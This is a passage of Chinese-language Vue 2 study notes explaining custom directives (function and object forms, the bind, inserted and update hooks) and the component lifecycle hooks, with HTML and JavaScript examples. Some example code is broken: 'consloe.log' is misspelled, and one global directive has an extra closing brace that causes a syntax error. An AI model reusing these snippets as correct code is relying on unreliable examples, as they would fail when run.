          return value.slice(0,4)
        }
      }
    })
  </script>
  </body>
```




## 自定义指令

- 局部指令
```js
new Vue({
  directives:{指令名:配置对象}
})

// 或
new Vue({
  directives(){}
})
```

- 全局指令
```js
Vue.directive(指令名,配置对象) 

// 或
Vue.directive(指令名,回调函数) 

```

- 配置对象中常用的3个回调
  - bind:指令与元素成功绑定时调用。
  - inserted：指令所在元素被插入页面时调用。
  - update:指令所在模板结构被重新解析时调用。

- 备注
  - 指令定义时不加v-,但使用时要加v-
  - 指令如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。

### 函数式
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8"/>
    <title>v-cloak指令</title>
    <!-- 引入vue -->
  </head>
  <body>
    <!-- 
      需求1：定义一个v-big指令，和v-text功能类似，但是会把绑定的数值放大10倍。
      需求2: 定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
     -->
    <div id="root">
      <h2>当前的n值是：<span v-text="n"></span></h2>
      <h2>放大10倍后的n值是：<span v-big="n"></span></h2>
      <button @click="n++">点我n+1</button>
    </div>
    <script type="text/javascript">



      const vm = new Vue({
        el:"#root", 
        data:{ 
          n:1
        },
        directives:{
          // big函数何时会被调用？1.指令和元素成功绑定时（一上来）。 2.指令所在的模板被重新解析时。
          // big:function(){}
          big(element,binding){
            element.innerText = binding.value * 10
          }
        }
      })
    </script>
   
  </body>
</html>
```



### 对象式
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8"/>
    <title></title>
    <!-- 引入vue -->
  </head>
  <body>
    <!-- 
      需求2: 定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
     -->
    <div id="root">
      <h2>放大10倍后的n值是：<span v-big-number="n"></span></h2>

      <input type="text" v-bind:value="n"/>
      <input type="text" v-fbind:value="n"/>
      <button @click="n++">点我n+1</button>
    </div>
    <script type="text/javascript"> 
      // 全局指令
      Vue.directive('fbind2',{
            // 指令与元素成功绑定时（一上来）
            bind(element,binding){
              consloe.log('this',this);// 注意此处的this是window
              console.log('bind')
              element.value = binding.value
            },

            // 指令所在元素被插入页面时
            inserted(element,binding){
              console.log('inserted')
              element.focus(); //获取焦点
            },

            // 指令所在的模板被重新解析时
            update(element,binding){
              console.log('update')
              element.value = binding.value
            }
      })


      Vue.directive('big-number2',function(element,binding){
              element.innerText = binding.value * 10
      }})


      const vm = new Vue({
        el:"#root", 
        data:{ 
          n:1
        },
        // 局部指令
        directives:{
          // fbind(element,binding){
          //   element.value = binding.value 
          //   element.focus(); // 初次进入页面不生效
          // }
          fbind:{
            // 指令与元素成功绑定时（一上来）
            bind(element,binding){
              consloe.log('this',this);// 注意此处的this是window
              console.log('bind')
              element.value = binding.value
            },

            // 指令所在元素被插入页面时
            inserted(element,binding){
              console.log('inserted')
              element.focus(); //获取焦点
            },

            // 指令所在的模板被重新解析时
            update(element,binding){
              console.log('update')
              element.value = binding.value
            }
          },
          'big-number':function(element,binding){
              element.innerText = binding.value * 10
          }
        }
      })
    </script>
  </body>
</html>
```


## 生命周期

定义：又名生命周期回调函数、生命周期函数、生命周期钩子。
作用：Vue在关键时刻帮我们调用的一些特殊名称的函数。
备注：
- 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
- 生命周期函数中this的指向是vm或组件实例对象。


挂载流程
- `beforeCreate`：【将要创建】
- `created`：【创建完毕】
- `beforeMount`：【将要挂载】
- `mounted`:【挂载完毕】（重要）Vue完成模板的解析并把初始的真实dom元素放入页面后（挂载完毕）调用。

更新流程
- `beforeUpdate`：【将要更新】
- `updated`：【更新完毕】

销毁流程
- `beforeDestroy`：【将要销毁】（重要）
- `destroyed`：【销毁完毕】



常用的生命周期钩子
- 1.`mounted`：发送ajax请求,启动定时器、绑定自定义事件、订阅消息等初始化操作。
- 2.`beforeDestroy`：清除定时器、解绑自定义事件、取消订阅消息等收尾工作。

```html
<script>
  export default {
    name:'Person',
    data(){
      return{

      }
    },
    methods:{

    },
    // 创建前的钩子1
    beforeCreate(){

    },
    // 创建完毕的钩子2
    created(){

    },
    // 挂载前3
    beforeMount(){

    },
    // 挂载完毕4
    mounted(){

    },
    // 更新前
    beforeUpdate(){

    },
    // 更新完毕
    updated(){

    },
    // 销毁前
    beforeDestroy(){

    },
    // 销毁完毕
    destroyed(){
      
    }
  }
</script>
```





关于销毁`Vue`实例
- 销毁后借助Vue开发工具看不到任何消息。
- 销毁后自定义事件会失效，但原生DOM事件依然有效。
- 一般不会在beforeDestroy操作数据，因为即便操作数据也不会再出发更新流程了。

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8"/>
    <title></title>
    <!-- 引入vue -->
  </head>
  <body>
    <!-- 
      需求2: 定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
     -->
    <div id="root">
      <h2>放大10倍后的n值是：<span v-big-number="n"></span></h2>

      <input type="text" v-bind:value="n"/>
      <input type="text" v-fbind:value="n"/>
      <button @click="n++">点我n+1</button>
    </div>
    <script type="text/javascript"> 
      const vm = new Vue({
        el:"#root", 
        data:{ 
          n:1
        }
      })
    </script>
  </body>
</html>
```

![image](/imgs/vue/vm1.png)


![image](/imgs/vue/vm2.png)


## Vscode插件
- Vue 3 Snippets
- Vetur-支持vue高亮